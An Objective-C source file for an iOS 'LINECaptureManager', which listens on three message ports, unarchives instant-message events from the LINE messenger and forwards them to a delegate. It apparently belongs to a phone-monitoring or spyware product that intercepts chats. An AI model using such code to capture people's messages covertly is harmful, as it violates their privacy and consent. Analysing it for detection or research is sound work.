//
//  LINECaptureManager.m
//  LINECaptureManager
//
//  Created by Makara Khloth on 11/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "LINECaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

@implementation LINECaptureManager

@synthesize mEventDelegate;

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture LINE messenger");
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kLINEMessagePort1 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kLINEMessagePort2 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
	if (!mMessagePortReader3) {
		mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kLINEMessagePort3
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader3 start];
	}
}

- (void) stopCapture {
	DLog (@"Stop capture LINE messenger");
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
	if (mMessagePortReader3) {
		[mMessagePortReader3 stop];
		[mMessagePortReader3 release];
		mMessagePortReader3 = nil;
	}
	
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kLINEArchived];
	DLog(@"LINE - imEvent = %@", imEvent)
    [unarchiver finishDecoding];	
		
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];	
		for (FxEvent *imStructureEvent in imStructureEvents) {		
			DLog (@"sending %@ ...", imStructureEvent)						
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];				
		}			
	}
	[unarchiver release];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
